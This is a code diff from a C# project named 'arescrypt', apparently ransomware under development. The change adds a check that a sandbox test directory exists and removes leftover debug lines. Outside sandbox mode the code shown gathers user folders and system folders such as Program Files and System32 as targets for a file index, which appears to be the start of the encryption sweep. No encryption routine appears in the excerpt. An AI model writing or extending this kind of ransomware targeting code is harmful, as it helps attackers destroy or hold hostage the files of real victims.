@@ -14,6 +14,8 @@ namespace arescrypt
         public static string currentWorkingDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
         private static bool sandBox = true; // Safemode for testing/debugging
 
+        private static string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
+
         static void Main(string[] args)
         {
             // Welcome message
@@ -29,9 +31,12 @@ namespace arescrypt
             var userSpecificDirs = new List<string> { "" };
             var systemSpecificDirs = new List<string> { "" };
             string[] fullFileIndex = { "" };
-            
+
             if (sandBox) // == true
-                userSpecificDirs.Add(currentWorkingDirectory + @"\sandboxedDirectory");
+                if (Directory.Exists(sandBoxDirectory))
+                    userSpecificDirs.Add(sandBoxDirectory);
+                else
+                    Console.WriteLine("Sandbox mode was enabled, but no sandbox directory was discovered.\nPlease create this directory: " + sandBoxDirectory);
             else if (!sandBox)
             {
                 // User specific directories, administrative rights shouldn't be required in order to write to these files
@@ -46,12 +51,7 @@ namespace arescrypt
                 systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
                 systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
             }
-
-            foreach (string dir in userSpecificDirs)
-                if (dir != "") { }
-                    // Console.WriteLine("[{0}]", string.Join(", ", FileHandler.DirSearch(dir)));
             
-            //*
             var userSpecificFiles = new List<string> { };
             var systemSpecificFiles = new List<string> { };
 
